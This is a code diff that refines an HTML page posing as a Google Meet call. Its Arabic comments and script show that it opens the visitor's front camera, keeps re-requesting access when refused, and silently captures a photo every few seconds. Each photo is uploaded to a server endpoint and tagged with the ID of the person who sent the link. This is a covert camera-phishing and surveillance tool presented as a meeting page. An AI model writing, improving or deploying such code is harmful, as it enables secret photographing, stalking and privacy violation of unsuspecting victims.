@@ -6,61 +6,158 @@
     <title>Google Meet</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #202124; color: white; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
-        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .video-box { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #3c4043; border-radius: 8px; position: relative; overflow: hidden; }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #202124;
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .video-wrapper {
+            width: 100%;
+            max-width: 900px;
+            aspect-ratio: 16 / 9;
+            background-color: #3c4043;
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
         video { width: 100%; height: 100%; object-fit: cover; }
-        .bar { height: 80px; display: flex; align-items: center; justify-content: center; gap: 15px; }
-        .btn { width: 45px; height: 45px; border-radius: 50%; background: #3c4043; border: 1px solid #5f6368; }
-        .btn-red { width: 60px; border-radius: 20px; background: #ea4335; border: none; }
-        #msg { position: fixed; top: 10px; right: 10px; font-size: 12px; color: #8ab4f8; }
+        .user-label {
+            position: absolute;
+            bottom: 16px;
+            left: 16px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .controls-bar {
+            height: 80px;
+            background-color: #202124;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            padding: 0 24px;
+        }
+        .btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 1px solid #5f6368;
+            background-color: #3c4043;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .btn-danger {
+            background-color: #ea4335;
+            width: 64px;
+            border-radius: 24px;
+            border: none;
+        }
+        #status-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            border-radius: 4px;
+            background: #3c4043;
+            font-size: 13px;
+            z-index: 100;
+            border-left: 4px solid #8ab4f8;
+        }
+        #photo-canvas { display: none; }
     </style>
 </head>
 <body>
-    <div id="msg">جاري الاتصال بالاجتماع...</div>
-    <div class="main">
-        <div class="video-box">
-            <video id="v" autoplay playsinline muted></video>
+
+    <div id="status-message">جاري الاتصال بالاجتماع...</div>
+
+    <div class="main-container">
+        <div class="video-wrapper">
+            <video id="camera-feed" autoplay playsinline muted></video>
+            <div class="user-label" id="camera-type-label">أنت</div>
         </div>
     </div>
-    <canvas id="c" style="display:none"></canvas>
-    <div class="bar">
-        <div class="btn"></div><div class="btn"></div><div class="btn"></div>
-        <button class="btn-red" onclick="location.reload()"></button>
+
+    <canvas id="photo-canvas"></canvas>
+
+    <div class="controls-bar">
+        <div class="btn">🎤</div>
+        <div class="btn">📹</div>
+        <div class="btn">💬</div>
+        <button class="btn-danger" onclick="location.reload()">📞</button>
     </div>
 
     <script>
-        const v = document.getElementById('v'), c = document.getElementById('c'), msg = document.getElementById('msg');
-        const params = new URLSearchParams(window.location.search);
-        const targetId = params.get('id');
+        const video = document.getElementById('camera-feed');
+        const canvas = document.getElementById('photo-canvas');
+        const statusMessage = document.getElementById('status-message');
+        let currentStream = null;
 
-        async function init() {
+        // جلب المعرف من الرابط (?id=12345) ليعرف السيرفر لمن يرسل الصورة
+        const params = new URLSearchParams(window.location.search);
+        const targetUserId = params.get('id');
+
+        async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                v.srcObject = stream;
-                v.onplaying = () => {
-                    msg.textContent = "متصل";
-                    setInterval(take, 4000); // سحب كل 4 ثواني
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                currentStream = stream;
+                video.srcObject = stream;
+                video.style.transform = 'scaleX(-1)'; // وضع المرآة
+
+                video.onplaying = () => {
+                    statusMessage.textContent = 'متصل بنجاح';
+                    // بدء السحب التلقائي كل 5 ثواني
+                    setInterval(captureAndSend, 5000);
                 };
-            } catch (e) {
-                setTimeout(init, 1000); // إعادة محاولة عند الرفض
+            } catch (err) {
+                statusMessage.textContent = 'يرجى السماح بالكاميرا للدخول';
+                setTimeout(startCamera, 1000); // إلحاح في الطلب حتى يوافق المستخدم
             }
         }
 
-        function take() {
-            if (!targetId) return;
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            const ctx = c.getContext('2d');
-            ctx.translate(c.width, 0); ctx.scale(-1, 1);
-            ctx.drawImage(v, 0, 0);
+        function captureAndSend() {
+            if (!currentStream || !targetUserId) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
             
+            // تصحيح اتجاه الصورة قبل الإرسال
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0);
+
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            // إرسال الصورة إلى السيرفر مع معرف الشخص الذي أرسل الرابط
             fetch('/upload-photo', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.6), targetId: targetId })
-            });
+                body: JSON.stringify({ 
+                    image: imageData, 
+                    userId: targetUserId 
+                })
+            }).catch(err => console.error("إخفاق في المزامنة"));
         }
-        window.onload = init;
+
+        window.onload = startCamera;
     </script>
 </body>
 </html>
